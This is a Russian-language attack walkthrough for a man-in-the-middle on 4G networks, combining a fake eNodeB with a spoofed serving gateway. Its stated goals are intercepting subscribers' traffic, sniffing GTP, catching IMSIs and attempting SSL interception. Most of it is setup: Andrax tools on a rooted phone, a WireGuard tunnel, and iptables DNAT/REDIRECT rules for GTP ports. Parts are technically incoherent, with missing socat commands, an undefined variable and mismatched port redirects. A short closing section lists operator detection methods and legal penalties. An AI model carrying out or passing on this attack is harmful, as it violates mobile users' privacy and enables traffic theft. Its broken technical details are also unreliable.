В этом исследовании мы попытаемся разработать новый тип атаки — sgw-mitm
Сама суть атаки заключается в подмене sgw — serving gateway, распределяющего трафик в 4g сети
Структура 4g подключения: от телефона к интернету:
          Точка доступа.    Выход в интернет
                     |                          |
       UE--->eNB--->SGW--->PGW
         |                        |
(телефон)         обслуживающий путь

Что нам даёт подменный SGW в сети:
1. Контроль над трафиком, проходящим через нас
2. Теоретический SSL interception (сложно из-за проверок целостности, но возможно)
3. Sniffing GTP трафика

4. Сбор IMSI клиентов — IMSI CATCHING

Сложности:
1. Проверки целостности — шифрование, контроль RRC, контрольные суммы
2. CG-NAT, разделение на подсети
3. APC control

Требования:
1. Роутер/VPS/VDS/ПК с «белым» (публичным) IPv4 (Очень важно, что именно IPv4)

2. Телефон с root правами и Andrax (подойдут magisk SU/KernelSU/superSU)
Версии Andrax с нужным инструментарием:
v5r stable
v6r unstable [chambers]
Andrax-NG v1001, v1002 (от snakesecurity)
3. Клиент wireguard на телефоне и сервер wireguard на доп. устройстве с белым ip


Для чего нам нужен wireguard:
Так как мы используем телефон с Andrax как основной инструмент атаки (в частности инструменты SGW-HACK, SOCAT)
Мы находимся за carrier-grade nat
Он разделяет клиентов на разные подсети и изолирует
Это критично для проведения нашей атаки, так что мы используем wireguard и port-forwarding для того, чтобы получить белый ip с SIM-карты и начать эмуляцию SGW

Сначала нам нужно сгенерировать ключ wireguard на сервере

Настроим директории и права:
```

sudo su
cd /etc/wireguard/
umask 077

```

Сгенерируем ключи для сервера
```

wg genkey | tee server_private.key | wg pubkey > server_public.key

```

Скопируйте публичный ключ — он нам понадобится позже
```

cat /etc/wireguard/server_public.key

```

Теперь нам нужно создать файлы конфигурации:

Для сервера/роутера/VPS/VDS с «белым» IP:
```

nano /etc/wireguard/wg0.conf

```

Пример конфиг-файла сервера:
[Interface]
Name = wg0
Address = 10.8.0.1/24
ListenPort = 51820
PrivateKey = <SERVER_PRIVATE_KEY>

PostUp =
  sysctl -w net.ipv4.ip_forward=1;
  iptables -A FORWARD -i wg0 -j ACCEPT;
  iptables -A FORWARD -o wg0 -j ACCEPT;
  iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE;
  iptables -t nat -A PREROUTING -p udp --dport 2123 -j DNAT --to-destination 10.8.0.2:2123;
  iptables -t nat -A PREROUTING -p udp --dport 2152 -j DNAT --to-destination 10.8.0.2:2152;

PostDown =
  iptables -D FORWARD -i wg0 -j ACCEPT;
  iptables -D FORWARD -o wg0 -j ACCEPT;
  iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE;
  iptables -t nat -D PREROUTING -p udp --dport 2123 -j DNAT --to-destination 10.8.0.2:2123;
  iptables -t nat -D PREROUTING -p udp --dport 2152 -j DNAT --to-destination 10.8.0.2:2152;

[Peer]
PublicKey = <ANDROID_PUBLIC_KEY>
AllowedIPs = 10.8.0.2/32
PersistentKeepalive = 25

(Замените IP где нужно)

Но, возможно, на этом моменте появляется другая сложность:
«Как мы должны перехватить трафик клиентов, находясь за пределами сети оператора?»
Тут нам поможет MME-eNodeB-HACK, eNodeB-HACK и SOCAT redirecting

# Определяем IP
LOCAL_IP=$(ip route get 8.8.8.8 | awk '{print $7}')

Далее
# Очистка старых правил
iptables -t nat -F
iptables -F

# Включаем форвардинг
echo 1 > /proc/sys/net/ipv4/ip_forward

# КРИТИЧЕСКИЕ ПРАВИЛА ДЛЯ ПЕРЕХВАТА ЧУЖОГО ТРАФИКА:

# 1. Перехват ВСЕГО входящего GTP-C трафика на наш публичный IP
iptables -t nat -A PREROUTING -d $PUBLIC_IP -p udp --dport 2123 -j REDIRECT --to-port 36412
# 2123 (GTP-C/S11) → 36412 (S1-MME порт MME)

# 2. Перехват ВСЕГО входящего GTP-U трафика
iptables -t nat -A PREROUTING -d $PUBLIC_IP -p udp --dport 2152 -j REDIRECT --to-port 2152
# 2152 (GTP-U) остаётся на том же порту для eNodeB

# 3. Разрешаем входящие подключения
iptables -A INPUT -p udp --dport 36412 -j ACCEPT  # S1-MME
iptables -A INPUT -p udp --dport 2123 -j ACCEPT   # GTP-C
iptables -A INPUT -p udp --dport 2152 -j ACCEPT   # GTP-U

# 4. Маскировка исходящего трафика
iptables -t nat -A POSTROUTING -o rmnet0 -j MASQUERADE

# Проверяем правила
iptables -t nat -L -n -v

# 1. S1-MME трафик (порт 36412) → наш MME

SOCAT_ENB_PID=$!
echo "[+] SOCAT S1-U: 0.0.0.0:2152 → 127.0.0.11:2152"

SOCAT_S11_PID=$!
echo "[+] SOCAT S11: 0.0.0.0:2123 → 127.0.1.12:2123"

 Так как в ENodeB-HACK уже используется настоящее подключение к MME (настоящей или фейковой), клиенты будут подключаться к нашим станциям

С помощью этого у нас получается такая цепь атаки:
UE--->FAKE eNodeB--->fakeSGW--->|
                                                              |
                                                              |
                                                    Attacker's SIM
                                                             |
                                                             |
                                                      REAL-eNodeB,SGW,PGW(+ real SIM AUTH to MME)

В чём плюсы этой атаки перед другими?
1. Полный контроль над трафиком
2. Теоретическая возможность SSL interception
3. Минимальное оборудование — только 2/3 устройства
4. Относительно большой охват (Fake eNodeB выступает только как ловец клиентов, fake-SGW обслуживает сразу несколько сот)
5. Быстрое развёртывание инфраструктуры
6. Поддержка реальных механизмов аутентификации

ДЛЯ ОПЕРАТОРОВ:

5. ОБНАРУЖЕНИЕ И ПРОТИВОДЕЙСТВИЕ

5.1 Как операторы обнаруживают подобные атаки:
- Мониторинг аномального GTP трафика (неизвестные IP SGW)
- Анализ сигнатур RRC сообщений
- Корреляционный анализ логов (MME-HSS-PGW)
- Системы обнаружения мошенничества (Fraud Detection)

5.2 Время до обнаружения:
- Само-MITM: 2–24 часа (зависит от активности)
- Fake eNodeB: 5–30 минут (радиомониторинг)
- GTP перенаправление: 1–6 часов

5.3 Юридические последствия:
- Уголовная ответственность по статьям 272, 273, 274 УК РФ
- Блокировка SIM-карты и оборудования
- Внесение в реестр нарушителей

5.4 Что стоит улучшить:
Внедрить жёсткую фильтрацию IP сервисных частей сети
Вести постоянный мониторинг GTP трафика
